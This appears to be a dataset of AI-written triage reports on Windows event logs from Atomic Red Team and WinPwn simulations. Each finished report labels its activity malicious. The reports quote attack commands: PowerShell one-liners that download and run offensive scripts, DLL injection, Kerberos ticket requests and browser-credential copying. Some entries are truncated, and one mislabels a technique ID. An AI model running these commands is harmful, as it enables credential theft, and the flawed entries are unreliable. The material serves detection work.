WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"After analyzing the provided Windows event logs, here is a detailed assessment:

1. **Sysmon and PowerShell Logs:**
   - There is a notable PowerShell execution where a script is downloaded from an external source and executed: 
     ```
     powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'), Invoke-Rubeus -Command \""asreproast /format:hashcat /nowrap\""}
     ```
   - The script `Invoke-Rubeus.ps1` from PowerSharpPack is known to be a tool used for Kerberos delegation and credential gathering, particularly AS-REP Roasting attacks. This is a commonly used technique in penetration testing and by malicious actors to gather credentials in a network. 

2. **Security Logs:**
   - The security log shows Event ID 1102, which indicates the security log was cleared. The action was performed by the user `admin_test`. Clearing event logs is highly suspicious behavior as it might be an attempt to cover tracks after malicious activities.
   - There are also multiple instances where the system time was changed (Event ID 4616), which could be part of an attempt to manipulate time stamps on logs or events to obscure activities.

3. **System Logs:**
   - The system log also reveals Event ID 104, indicating that both the System and Windows PowerShell log files were cleared around the same period, by the user `admin_test`. Similar to the security log clearance, this is suspicious and common in attempts to cover malicious activity.

4. **Application Logs:**
   - The application logs mostly show service status updates and interactions with Windows Defender, which appear typical and not overly suspicious outside the context of the other logs.

**Assessment and Resolution:**
The combination of script execution for potentially credential harvesting, along with the evidence of log file clearing and manipulation of system time, constitutes significant indicators of malicious activity. Such actions strongly align with behaviors intended to conduct unauthorized access and erase tracks.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
- Initiate an incident response process to contain and investigate the threat further.
- Conduct a deeper forensic analysis of the affected system and potentially compromised accounts.
- Conduct a security review to ensure the system and network integrity, including potential backdoors or other malicious implants.
- Reset credentials and verify user accounts to mitigate the risk of further credential misuse.
- Review and enhance logging and monitoring for future activity, ensuring logs are stored remotely to prevent tampering.
- Educate users on secure practices, particularly regarding PowerShell and downloading scripts from external sources."
WinPwn - BrowserPwn,"### Detailed Analysis of the Windows Event Logs

#### Indicators of Potential Malicious Activity

1. **Log Clear Events**
   - **Event ID 1102 in Security Log** and multiple **Event ID 104 in System Log** indicate that the event logs have been cleared. The user `admin_test` performed these actions. Clearing of logs is a common tactic employed by malicious actors to cover tracks and hinder analysis after a compromise.

2. **Suspicious PowerShell Activity**
   - In the **Sysmon Log** and **Windows PowerShell log**, there is evidence of suspicious PowerShell activity:
     - **Event ID 1 in Sysmon Log** shows execution of `powershell.exe` with the command line that downloads and executes a script from a GitHub repository (`WinPwn.ps1`). This script execution via PowerShell is particularly concerning and suggests potential unauthorized or malicious activity.
     - **Windows PowerShell Log** confirms the suspicious PowerShell execution, referencing actions that indicate the use of `iex(new-object net.webclient).downloadstring`, which is a common method used to download and execute scripts, directly reflecting in the logs.

3. **Time Change Events**
   - There are **Event ID 4616 in Security Log** and corresponding events in the **System Log** showing changes to the system time. While time adjustments happen normally, combined with other suspicious activities, it could be indicative of an attempt to manipulate time for malicious purposes, such as to evade detection.

4. **Processes with High Integrity Level**
   - Multiple Sysmon events highlight the execution of processes (`wevtutil.exe`, `hostname.exe`, `whoami.exe`) operating at a high integrity level under the user `admin_test`. These utilities, while legitimate, are used in suspicious sequences just before or after key events like log clearing and PowerShell script execution.

### Assessment of the Situation

Given the combination of:
- Log clearance activities,
- Execution of potential malicious scripts via PowerShell,
- High integrity level utilities being employed,
- System time manipulation,

There are several red flags indicating malicious activity. The observed behavior presents a pattern that is typical of post-exploitation activities where an attacker might be executing reconnaissance commands, cleansing logs to avoid detection, and testing persistence methods via PowerShell scripts that could potentially download and run unauthorized utilities.

### Recommendation

Based on the findings above, the situation is assessed as **MALICIOUS**. Immediate steps should be taken to:

- Isolate the affected system to prevent further potential malicious activity.
- Conduct a full forensic analysis of the system to understand the extent of the compromise, which may include recovering cleared logs, verifying file integrity, and reviewing network activity.
- Reset credentials and closely monitor further activity of the user `admin_test`.
- Implement enhanced monitoring on all systems across the network for similar unauthorized behavior.
- Review and possibly update security policies and procedures to prevent similar incidents in the future.

These actions will help in containing any potential breach and mitigate further risks to the organization."
Stage Popular Credential Files for Exfiltration,"Upon analysis of the provided Windows event logs, I have identified the following points of interest and potential indicators of malicious activity:

1. **Log File Clearing (Security Log, Event ID 1102 and System Log, Event ID 104):**
   - The Security, System, and Windows PowerShell event logs were manually cleared by a user identified as ""admin_test"" (subject logon ID: 0x13900B and 0x13B769), which is a common tactic to remove traces of illicit activity. The clearing of logs itself is a significant indicator that someone attempted to cover their tracks.

2. **Privilege Escalation**
   - In the Security Log (Event ID 4672), the user ""admin_test"" was granted a set of high privileges including SeDebugPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, and others. This indicates that the user had administrative capabilities which might be leveraged for malicious intent.

3. **Suspicious PowerShell Command Execution:**
   - The Sysmon Log (EventID 1) shows a PowerShell script being executed that is designed to collect and exfiltrate user credentials from web browsers such as Mozilla Firefox, Google Chrome, Opera, and Microsoft Edge. This involves copying credential files to a temporary directory and compressing them into a ZIP file for likely exfiltration. This activity is highly indicative of credential theft.

4. **Unusual Time Change Event:**
   - In the Security Log (Event ID 4616), an unauthorized system time modification is logged. Unauthorized changes to system time can disrupt log sequencing and could be part of an attempt to maintain persistence or hide activities.

5. **Process Execution with Wevtutil:**
   - Numerous instances of the ""wevtutil.exe"" command-line utility were logged, being executed by ""admin_test"". This tool is used for managing event logs. Although it may be used for benign administrative tasks, in the context of cleared logs and suspicious PowerShell activity, it raises suspicion of an attempt to manipulate or clear logs.

6. **Network Logon Type:**
   - Security Log (Event ID 4624) indicates a successful NTLM logon from an external machine (""DESKTOP-3HL5B2P""). While the use of NTLM is not uncommon, in combination with the above activities, it could signify lateral movement in the network.

### Conclusion:
Given the evidence of log clearing, suspicious PowerShell script execution aimed at credential theft, privilege escalation, and potential lateral movement, these actions strongly indicate malicious activity.

### Resolution: MALICIOUS

### Guidance on how to proceed:
- Immediately isolate the affected host (“Server002”) to prevent further data exfiltration.
- Conduct a full forensic investigation to assess the scope and impact of the attack, focusing on the collected credentials.
- Review and tighten security policies, especially for privileged accounts such as ""admin_test"". Consider resetting credentials for potentially compromised accounts.
- Improve monitoring and alerting for suspicious activity related to the usage of tools like PowerShell and Wevtutil, and enable detailed logging for better traceability.
- Evaluate the security measures in place for network authentication protocols (e.g., NTLM) and consider transitioning to more secure alternatives if feasible."
WinPwn - Loot local Credentials - Wifi Credentials,"Based on the provided log entries, several indicators suggest potentially malicious activity, warranting a detailed analysis:

1. **Log Clearing Events:**
   - The Windows event logs show multiple entries for log clearing (`EventID: 1102`), which are typically indicative of an attempt to cover tracks. The admin user `admin_test` cleared security, system, and Windows PowerShell event logs within a very short time frame. This behavior is suspicious, especially in the context of security investigations.

2. **Suspicious PowerShell Activity:**
   - The Windows PowerShell logs reveal that PowerShell was used to execute a script from a suspicious external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`). Downloading and executing scripts from public repositories without appropriate verification is a red flag and often indicative of a compromise attempt through malicious scripts.
   - The script `WinPwn.ps1` executed commands that include `wificreds` with the `-consoleoutput` and `-noninteractive` arguments, suggesting an attempt to extract Wi-Fi credentials—an action often associated with reconnaissance or credential theft.

3. **Abnormal System Time Change:**
   - The logs also indicate a change in system time (`EventID: 4616`), which can be leveraged by attackers to manipulate timestamps, potentially affecting the timeline of events recorded in the logs. Although this alone is not a definitive indicator of compromise, combined with other activities, it becomes a point of concern.

4. **Sysmon Logs Indicate Potentially Malicious Process Execution:**
   - Sysmon logs display multiple executions of `wevtutil.exe` for clearing event logs, consistent with suspicious log clearing activities.
   - The execution of `powershell.exe` containing command constructs with `iex` (Invoke-Expression) and web requests is typically indicative of running possibly malicious scripts from external sources.

Combining these observations, there is compelling evidence of activities consistent with malicious behavior, including log tampering, suspicious script execution via PowerShell from an external source, and potential data exfiltration attempts.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Conduct a full security audit on `Server002`, focusing on past activities and potential compromise.
- Isolate the affected host to prevent further action by potential attackers.
- Verify and respond to any data exfiltration that may have occurred through network logs.
- Review and restrict user permissions, especially those of the `admin_test` account, to prevent unauthorized actions in the future.
- Implement tighter monitoring and alerting mechanisms for PowerShell activities and log file accesses."
Trigger an authenticated RPC call to a target server with no Sign flag set,"### Log Analysis

#### Indicators of Malicious Activity

1. **PowerShell Activity:**
   - The command ""powershell.exe & {rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 1>$Null}"" appears multiple times. This use of PowerShell to invoke `rpcping` locally is unusual and could indicate a technique used for lateral movement or C2 communications.

2. **Log Clearing Events:**
   - The Event IDs 104 from the System log and Event ID 1102 from the Security log indicate that logs have been cleared. Specifically, the Windows PowerShell and System logs were cleared almost simultaneously by user ""admin_test"". This is a significant red flag, as attackers often clear logs to erase traces of their activity.

3. **Sysmon Execution Logs:**
   - There are multiple executions of `wevtutil.exe` used to clear logs (""cl"" argument), which corroborates the log clearing activities. This tool is traditionally used for managing Windows Event Logs, and its use in clearing logs suggests malicious intent to cover tracks.

4. **Parent-Child Process Relationship:**
   - Processes `wevtutil.exe`, `conhost.exe`, and `powershell.exe` show a pattern involving the user ""SERVER002\admin_test"" which initiated these processes. These are connected by a sequence of high integrity level processes, reinforcing potential privilege escalation or misuse.

5. **Presence of Network Tools:**
   - The usage of `RpcPing.exe` in conjunction with `powershell.exe` raises suspicions about possible network reconnaissance or exploitation actions.

#### Assessment

The logs showcase multiple events that strongly indicate potential malicious activity:
- Execution of PowerShell with suspicious command-hosting typical lateral movement tools.
- Concurrent clearing of critical logs, indicating an attempt to remove evidence of activity.
- Utilization of administrative command-line tool (`wevtutil.exe`) under a high integrity context for log manipulation.

### Resolution

**MALICIOUS**

The activities observed across the Windows Event Logs reflect significant anomalies consistent with malicious operations such as privilege escalation, log tampering, and potentially lateral movement or C2 setup practices. Immediate response actions are required.

### Recommendations

1. **Immediate Containment:**
   - Isolate the affected host ('Server002') from the network to prevent further spread or operation by the adversary.
   
2. **Investigation and Forensics:**
   - Conduct a full forensic examination of the system to determine the full scope of potential compromise.
   - Review user account activities, particularly the account ""admin_test”, for unauthorized access or privilege misuse.

3. **Mitigation and Remediation:**
   - Reset all passwords, especially for accounts with administrative access.
   - Disable or restrict the use of PowerShell for non-administrative users to limit potential misuse.
   - Reinforce endpoint security measures, such as EDR solutions, to provide better monitoring and detection capabilities.
   - Apply all security updates and patches to mitigate known vulnerabilities that could have been exploited.

4. **Monitoring and Review:**
   - Monitor logs and network traffic for further suspicious activities.
   - Review and enhance logging and alerting mechanisms to detect such activities preemptively.

By promptly addressing these issues, the risk of further exploitation or damage can be mitigated effectively."
Request A Single Ticket via PowerShell,"### Analysis and Findings

Upon reviewing the provided logs from the Windows host, several indicators of suspicious behavior were identified.

#### 1. **Clearing of Event Logs:**
   - **Security Log:**
     - Event ID 1102 indicates the Security log was cleared by a user with the username `admin_test`. Clearing event logs is often done to remove evidence of malicious activities.
   - **System Log:**
     - Event ID 104 indicates the System log was cleared by `admin_test`. This also points towards potential evidence tampering.
   - **PowerShell Log:**
     - Event ID 104 indicates the Windows PowerShell log was cleared as well. Given that PowerShell is frequently used for scripting and automation, its log clearance is suspicious, especially if tied with other anomalous activities.

#### 2. **Suspicious PowerShell Activity:**
   - Multiple PowerShell processes were spawned with commands involving sensitive security operations:
     - A PowerShell command was executed that included:
       ```
       Add-Type -AssemblyName System.IdentityModel; $ComputerFQDN=$env:LogonServer.trimStart('\\') + ""."" + $env:UserDnsDomain; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""HTTP/$ComputerFQDN""
       ```
     - The use of PowerShell with system and potential network operations in conjunction with cleared logs can indicate script execution for potential lateral movement or exploitation.

#### 3. **Use of `wevtutil.exe`:**
   - Multiple executions of `wevtutil.exe` including command line arguments such as clearing specific event logs (Sysmon/Operational, Application, System, Security) were noted. This utility is often used to manage event logs, and such actions strongly indicate an attempt to cover tracks.

#### 4. **Edge Update Activities:**
   - There are numerous executions of Microsoft Edge Update processes around the same timestamps. While these could be legitimate update activities, they might also be leveraged to execute or hide within trusted processes.

### Conclusion: MALICIOUS
The combination of cleared logs, suspicious PowerShell executions, and the systematic use of `wevtutil.exe` to clear logs is consistent with behavior seen in attempts to compromise systems and later cover tracks. Additionally, executing PowerShell scripts that involve modifying or accessing security tokens is suspicious and indicative of potential privilege escalation or lateral movement attempts.

### Recommendations
- **Immediate Incident Response:** Disconnect the affected machine from the network to prevent further spread of potential malicious activity.
- **Forensic Analysis:** Perform a deeper forensic analysis of the Windows host. Examine leftover artifacts in system files, registry hives, and any potentially recovered logs.
- **User Audit:** Investigate the activities and access privileges of the user `admin_test`.
- **Security Policy Update:** Consider updating audit policies to ensure comprehensive logging and frequent review, making it harder for logs to be effectively cleared without detection.
- **System Monitoring:** Implement or enhance monitoring solutions to detect similar behavior patterns in real-time to prevent and respond swiftly to future incidents."
"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials","### Detailed Analysis

#### Indicators of Malicious Activity
1. **Event Log Clearing**: There are multiple instances of the `wevtutil.exe` process with command lines that clear event logs (Sysmon, Application, Security, System, and PowerShell). This behavior is typically associated with attempts to remove traces of activities from the system and is a strong indicator of malicious activity.

2. **Suspicious PowerShell Activity**: The logs capture the execution of `powershell.exe` with a command that downloads and executes a script from a GitHub URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/..../WinPwn.ps1`). This action, especially when performed without user consent or knowledge, is highly suspicious and associated with downloading and running potentially malicious payloads.

3. **High Integrity Level**: The actions were executed under a high integrity level by user `SERVER002\\admin_test`, indicating that an administrative account was used, which could allow for greater control and compromise of the system.

4. **Clearing of PowerShell Logs**: The log entries indicate clearing of the PowerShell event logs, which further corroborates attempts to hide the operations performed via PowerShell.

#### Risks Identified
- **Potential Backdoor or Payload Execution**: The use of PowerShell to download and execute a script from a remote repository poses a serious threat, as it could serve as a backdoor or deliver additional malicious payloads to the host.

- **Privileged Account Usage**: The usage of an administrative account (likely compromised) to execute these actions represents a heightened security risk, allowing broad access and manipulation of the system.

- **Log Tampering**: Clearing logs not only indicates nefarious intent but also makes it difficult to trace back activities, hence hindering any forensics or incident response efforts.

### Guidance
- **Immediate Isolation**: The affected system should be isolated from the network to prevent further compromise or lateral movement within the network.
- **In-depth Forensics**: Conduct a thorough forensic investigation to determine the full extent of the compromise, focusing on the PowerShell script invoked and any potential backdoors or malware introduced by it.

Hook PowerShell TLS Encrypt-Decrypt Messages,"### Analysis

After reviewing the event logs, there are several indicators of potentially malicious activity on the host. Below is a detailed analysis:

1. **Use of PowerShell for Malicious Purposes:**
   - A PowerShell session (EventRecordID 17977) includes the command to inject a DLL using `mavinject` and perform a web request from `https://www.example.com`. The command:
     ```
     ""powershell.exe"" & {mavinject $pid /INJECTRUNNING \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1056.004\\bin\\T1056.004x64.dll\"", Invoke-WebRequest https://www.example.com -UseBasicParsing}
     ```
     - The use of `mavinject` indicates process injection, which is a common technique used in malware operations.
     - The presence of a DLL related to Atomic Red Team suggests that this could be an exploitation attempt or a penetration testing tool used for malicious purposes.

2. **Event Log Clearing:**
   - The event logs indicate the clearing of multiple logs, including the ""System"" and ""Windows PowerShell"" logs (EventRecordID 3566 and 3567).
   - EventID 1102 in the Security log shows that the security log was cleared as well (EventRecordID 30348).
   - Clearing logs is often an indicator of malicious activity aiming to cover tracks.

3. **Time Change:**
   - A suspicious change in system time is observed (Security EventRecordID 30349-30350 and System EventRecordID 3569-3572). Malicious actors may alter system time to evade detection mechanisms that rely on timestamps.

4. **Privilege Escalation:**
   - The account `SERVER002\\admin_test` leveraged several high-privilege rights (EventRecordID 30352 and 30354), some of which are unusual for regular operations, indicating potential privilege escalation.

5. **Process Monitoring and Hijacking:**
   - Frequent command line logging and process spawning activities, especially involving system utilities like `wevtutil.exe` and `conhost.exe`, indicate possible monitoring or command hijacking.

### Conclusion

Azure - Search Azure AD User Attributes for Passwords,"After a detailed analysis of the provided Windows event logs, the following observations were made:

### Suspicious or Anomalous Behavior:

1. **Clearing of Event Logs:**
   - Security Logs: Event ID 1102 indicates that the security logs were cleared by the user `admin_test`, which is often a tactic used by attackers to cover their tracks.
   - System Logs: Event ID 104 shows the system logs were cleared almost simultaneously.
   - Windows PowerShell Logs: Event ID 104 further indicates Windows PowerShell logs were also cleared.

2. **Usage of PowerShell for Suspicious Script:**
   - A PowerShell script was executed that used `import-module msonline`, and created a credential object with `ConvertTo-SecureString` for storing the password.
   - It fetched all MSOL users and attempted to extract and store properties containing the word ""password"" into a temporary file (`T1552.005Test1.txt`), which is indicative of credential grazing or credential harvesting attempts.
   - The file is then read silently, likely for consolidation or exfiltration.

3. **Use of `wevtutil` Command:**
   - Multiple instances of `wevtutil.exe` were executed with the `cl` (clear) command to clear logs for `Microsoft-Windows-Sysmon/Operational`, `System`, `Application`, and others. `wevtutil` is a legitimate tool but can be used maliciously to delete event logs.

4. **Execution of `whoami.exe`:**
   - This is a deviation from regular usage unless it is used to verify the current user context in a potentially compromised system.

### Indicators of Malicious Activity:

- The simultaneous clearing of logs across different log types (Security, System, and Windows PowerShell) is highly suspicious and often a definitive indicator of an attempt to destroy evidence of malicious actions.
- The PowerShell script executed reveals a potentially harmful activity targeting user credentials, aligning with tactics used in attacks for credential dumping (T1552.005: Credentials from Web Browsers).
- The combination of these actions strongly suggests malicious intent rather than standard administrative maintenance.

### Assessment and Threats Identified:

- The event pattern strongly indicates a compromise with an active effort to hide tracks and extract sensitive user credential information using PowerShell.
- The behavior matches known attack patterns where an attacker seeks to maintain persistence and cover tracks by removing forensic traces through log clearing.

### Guidance on How to Proceed:

- Immediate incident response action is recommended, including:
  - Isolate the affected host (Server002) to prevent further lateral movement or data exfiltration.
  - Conduct a comprehensive forensic analysis to identify any other potential compromises and ensure containment.
  - Assess all accessed resources for unauthorized changes or access.
  - Reset credentials and audit accounts for suspicious activity.
  - Review network and endpoint defenses to close any identified gaps.

### Resolution:
- **MALICIOUS**: The logs contain indicators of malicious activity, particularly the log clearing events and credential harvesting attempts using PowerShell, suggesting an active compromise."
Run DSInternals Get-ADReplAccount,"Based on the provided logs, we can identify several indicators that suggest potentially malicious activities are occurring on the Windows host (Server002). Below is a breakdown of the observations and the ultimate determination:

### Observations:

1. **Wevtutil Usage Indicating Log Clearing:**
   - The Sysmon logs highlight that `wevtutil.exe` was used multiple times to clear various event logs (Security, Application, and System logs) within the span of a few seconds. This behavior is captured with entries where `wevtutil.exe` is run with the `cl` command (indicating clear log action), executed by the user `admin_test`.
   - Security Event ID 1102 also confirms that logs were cleared, with the `SubjectUserName` being `admin_test`.

2. **Suspicious PowerShell Command:**
   - A PowerShell command is being run to get Active Directory replication account details: `Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(\""\\\"")`. While this command itself may not be inherently malicious, the context—combined with log clearing—is suspicious.
   - It suggests an attempt to enumerate sensitive directory information which could form phase one (discovery) of an attack.

3. **Administrative Privilege Executions:**
   - The process executions, especially involving PowerShell and `wevtutil.exe`, are executed at a high integrity level (indicative of administrative privileges).

4. **Consistent Execution by `admin_test`:**
   - All suspicious activities such as PowerShell commands and usage of `wevtutil.exe` (to clear logs) are executed by the user `admin_test`, within the same timeframe.

5. **Attempted Obfuscation Indicators:**
   - Clearing of log files using `wevtutil.exe` suggests an attempt to cover tracks, which is often a strong indicator of malicious intent.

### Conclusion:

Given the combination of suspicious use of PowerShell to query Active Directory information, coupled with the systematic clearing of event logs (a classic indicator of malicious intent to erase tracks), the logs suggest potentially malicious activities.

Therefore, the final resolution for this analysis is:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

- **Immediate Action:** 
  - Suspend the `admin_test` account and investigate any other systems accessed by this account.

  - Examine the need for multi-factor authentication to enhance security for administrative roles."
Simulating access to Opera Login Data,"The logs provided indicate a series of activities on the Windows host ""Server002"" that are strongly suggestive of malicious activity. Below is a detailed analysis:

1. **PowerShell Activity**: 
   - The PowerShell logs show the execution of a command to copy sensitive user data from the Opera web browser's login data file to a temporary directory named ""ExternalPayloads"". The command used is `Copy-Item ""$env:APPDATA\\Opera Software\\Opera Stable\\Login Data"" -Destination ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads""`. This is indicative of potential credential theft or exfiltration attempt, often seen in unauthorized or malicious scripts.

2. **Event Log Clearing**: 
   - The Security and System logs both contain entries showing event log clearance (EventID 1102 for Security and EventID 104 for System). The user ""admin_test"" is associated with clearing these logs. Clearing event logs is a common tactic used by attackers to hide tracks and erase evidence of malicious actions.

3. **Sysmon Analysis**:
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) followed by its corresponding `conhost.exe` processes are observed, all executed by the user ""SERVER002\\admin_test"". This tool facilitates clearing of event logs, which coincides with the log clear operations previously mentioned.
   - A PowerShell instance is observed executing a command consistent with the extraction of login data, which is confirmed by the Sysmon event capturing the PowerShell execution with its command line details.

### Conclusion

The combination of these activities—especially the PowerShell command aimed at copying sensitive login data to an external directory, the subsequent clearing of event logs, and the execution patterns involving `wevtutil.exe`—are strongly indicative of malicious behavior. These activities align with known tactics for data exfiltration and cover-up operations used by adversaries.

**Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Isolation**: Isolate ""Server002"" from the network to prevent further data exfiltration or malicious actions.
2. **Forensic Analysis**: Conduct a comprehensive forensic analysis on ""Server002"", including a review of all execution artifacts and a deeper investigation into the user's actions associated with ""admin_test"".
3. **Incident Response**: Engage the incident response team to assess the breach's scope and implement measures to mitigate any potential impacts.
4. **Review and Remediation**: Review the existing security posture and logs to identify potential vulnerabilities and backdoors. Update systems, enhance monitoring, and implement additional security controls to prevent future incidents.
5. **Legal and Compliance**: Consider notifying legal and compliance teams due to potential data breach involving user credentials, and follow appropriate regulatory actions."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list),"Upon reviewing the logs provided, the following points stand out as suspicious or indicative of potentially malicious activity:

### Indicators of Anomalous or Malicious Activity:

1. **Log Clearing Activities:**
   - The security logs show several instances where event logs were cleared. Specifically, there are entries with the `EventID 1102` in the Security log and `EventID 104` in the System log.
   - The logs indicate these actions were performed by the user `admin_test`. Log clearing without a legitimate reason can often be an attempt to cover tracks after unauthorized or malicious activities.

2. **Account Enumeration and Credential Events:**
   - Several events with `EventID 5379` in the security log indicate credential access attempts, potentially for account enumeration. The `ReturnCode 3221226021` implies failure, but the frequent occurrence suggests attempts to retrieve account information.

3. **Repeated Use of `wevtutil`:**
   - There are multiple Sysmon log entries indicating the execution of `wevtutil` with command lines clearing various logs (e.g., Security, System, Windows PowerShell logs).
   - These actions are logged as having been performed directly from a high integrity context (`High` integrity level), under the same user context `SERVER002\\admin_test`.

4. **Suspicious PowerShell Activity:**
   - PowerShell execution is captured in the logs. The command `appcmd.exe list apppool` is widely considered benign when executed during normal administrative tasks. However, its being run via PowerShell scripts in coordination with log clearing activity can imply suspicious intentions.

5. **Presence of High Integrity Levels:**
   - The integrity level being consistently `High` across many suspicious activities points to potential privilege escalation.

### Recommended Actions:

Given these observations, it is crucial to:

- Conduct a thorough investigation to determine if `admin_test` user was authorized to clear event logs.
- Verify if there are legitimate reasons associated with the log clearing and PowerShell commands executed.
- Review other systems and users for similar patterns, potentially indicating lateral movement or broader compromise attempts.
- Check for any indications of data exfiltration or further compromise attempts elsewhere in the network.

### Resolution:
Based on the artifacts and actions observed in the logs, the analyzed activity can be classified as **MALICIOUS**. The use of log clearing tools and unauthorized access attempts signifies intentional obfuscation and privilege misuse, which are common behaviors in compromise scenarios. Immediate attention and remediation are necessary to address potential threats."
GPP Passwords (Get-GPPPassword),"## Detailed Analysis of the Windows Event Logs:

### Suspicious or Anomalous Behavior:
1. **Usage of PowerShell with Suspicious Script:**
   - The logs show that `powershell.exe` was used to execute a script (`Get-GPPPassword.ps1`) located in a temporary directory associated with the Atomic Red Team framework. This script execution is from an unexpected path (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\Get-GPPPassword.ps1`) which suggests potential use in an attack simulation or reconnaissance activity, specifically for extracting Group Policy Preferences (GPP) passwords.
   
2. **Continuous Use of Wevtutil:**
   - The `wevtutil.exe` utility is observed being used multiple times to clear sections of the event logs such as the System, Security, and Application logs. This is often an indicator that someone might be covering tracks, as legitimate use of this utility to clear logs should be infrequent and well-justified.

3. **Log File Clearing:**
   - Several instances are recorded where logs were cleared by the user `admin_test`, both in System logs and Security logs. Clearing event logs, especially without immediate and legitimate reasoning, is suspicious as it may indicate attempts to erase evidence of potentially malicious activities.

4. **Execution of Console Host (Conhost.exe):**
   - `conhost.exe` processes appear multiple times with different commands, which, while common as a legitimate console window host, should still be reviewed in conjunction with the context and associated activities like powershell execution. 

5. **Unusual Timing and Volume of Events:**
   - There is a large volume of command executions centralized around `20:34:07` to `20:34:10`. This timing correlation suggests an orchestrated sequence of activities rather than routine operations.

### Indicative Evidence of Malicious Activity or Compromise:
- Deployment of PowerShell scripts used for credential gathering in combination with event log clearing is a strong indicator of malicious intent.
- Although the logs also display actions related to services and components expected on a Windows system, these activities alone do not account for the unauthorized usage of scripts and subsequent covering actions.

### Threats or Risks Identified:
- **Credential Theft and Lateral Movement:**
  - With the use of the `Get-GPPPassword.ps1`, potential credential theft could lead to further intrusions or unauthorized movements within the network.
- **Event Log Tampering:**
  - As logs have been cleared, the true extent and specifics of activities may be hidden, complicating incident response efforts and forensic analysis.

### Resolution:
- **Resolution: MALICIOUS**
  - Given the combination of credential-stealing scripts, unauthorized event log clearing, and power usage of system utilities and scripts from temporary paths, the activity captured in these logs indicates a malicious attempt or simulation of a credential-harvesting operation.

### Guidance on How to Proceed:
1. **Forensic Capture:**
   - Capture forensic images of affected systems to prevent further data tampering and facilitate an in-depth analysis.
2. **Containment Measures:**
   - Isolate the affected host (`Server002`) from the network to prevent lateral movement or further unauthorized access.
3. **User Awareness:**
   - Immediately notify the `admin_test` user associated with these actions and evaluate their access level and recent account activity for further signs of compromise.
4. **Audit and Review:**
   - Conduct a thorough audit of systems for similar scripts or activity and extend the review network-wide to ensure no other machines are compromised.
5. **Recovery Actions:**
   - Based on further analysis, plan recovery steps which may include restoring systems from clean backups and changing credentials known to the stolen ones.
6. **Security Enhancements:**
   - Investigate and apply additional security controls, such as restricting PowerShell execution policies, to mitigate future risks of similar exploitation vectors. 

The sequence of actions observed in conjunction with malicious indicators necessitates immediate remediation and vigilance for potential further security threats."
Export Root Certificate with Export-PFXCertificate,"Upon reviewing the provided logs, several indicators of potential malicious activity stand out. Here's a detailed analysis:

### Indicators of Potential Malicious Activity:

1. **Log File Clearing:**
   - The system log shows Event ID 104 for log file clearing actions on System, Windows PowerShell, and Security channels by a user ""admin_test"". These actions took place in rapid succession within a short timeframe (around 20:10:53.9509435 to 20:10:54.0045707). Clearing logs is often used by attackers to cover their tracks, which is suspicious behavior.
   
2. **PowerShell Activity:**
   - The PowerShell logs contain a session where `powershell.exe` executed a script to create a self-signed certificate for `atomicredteam.com` and export it to a PFX file with a password (`AtomicRedTeam`). The use of self-signed certificates and storing them could suggest preparations for something malicious, such as deploying malicious payloads or spoofing credentials.

3. **Unusual Command-Line Arguments:**
   - Sysmon logs record the execution of `wevtutil.exe cl ...` (clear event logs) and `whoami.exe`. The frequent use of `wevtutil` to clear logs corroborates the suspicious log-clearing events noted earlier.

4. **Registry and Certificate Manipulation:**
   - Security logs show key operations related to creating and manipulating keys with the RSA algorithm, aligned with the observed PowerShell activities. These actions, executed by user ""admin_test"", may suggest the establishment of backdoor access using cryptographic keys.

5. **EdgeUpdate Process Activity:**
   - There are a series of processes related to `MicrosoftEdgeUpdate.exe` and associated components running under `NT AUTHORITY\SYSTEM`. While EdgeUpdate could be legitimate, the high frequency and timing in conjunction with other suspicious activities warrant closer scrutiny. Some executable paths like `MicrosoftEdgeUpdateComRegisterShell64.exe` indicate typical software update actions but still deserve follow-up due to association timing.

### Assessment:
The combination of log clearing by a specific user, suspicious PowerShell usage, command execution patterns, and system-level processes aligns with behaviors often associated with malicious access and persistence activities.

### Resolution:
- **Resolution: MALICIOUS**

### Guidance:
- **Immediate Actions:**
  1. Isolate the affected host (Server002) from the network to prevent further potential malicious activity.
  2. Conduct an in-depth forensic analysis on the server, including memory analysis, to identify any implanted malware or scripts.
  3. Reset credentials and investigate the legitimacy and roles of the user account ""admin_test"".
  4. Review any sensitive data accessed or altered and assess for possible data exfiltration or tampering.
  
- **Suggested Long-term Measures:**
  1. Enhance monitoring and alerting rules for similar suspicious activities, such as unauthorized log clearance and PowerShell usage.
  2. Implement stricter access controls and conduct regular audits on accounts with administrative privileges.
  3. Harden logging systems to ensure better logging integrity and mitigate easy clearance by malicious actors."
Dump Kerberos Tickets from LSA using dumper.ps1,"After reviewing the provided Windows event logs for the host machine, here are the key findings that indicate potential malicious activity:

1. **Event Log Clearing (Suspicious Activity)**
   - Security, System, and Windows PowerShell logs were cleared (`EventID: 1102, 104`). Log clearing is typically done by malicious actors to cover their tracks. The process `wevtutil.exe` was used, indicating that an adversary may have used a common log-clearing technique.

2. **Time Manipulation Event (`EventID: 4616, 24, 35`)**
   - The system time was manipulated, which can indicate an attempt to alter timestamps in logs to obfuscate activity timing. Two time changes are logged, both involving `svchost.exe`.

3. **Privilege Escalation (`EventID: 4672`)**
   - Multiple privilege escalation events involving the user `admin_test` were logged, granting extensive privileges, including `SeDebugPrivilege`, which is often leveraged for malicious purposes.

4. **Suspicious PowerShell Activity**
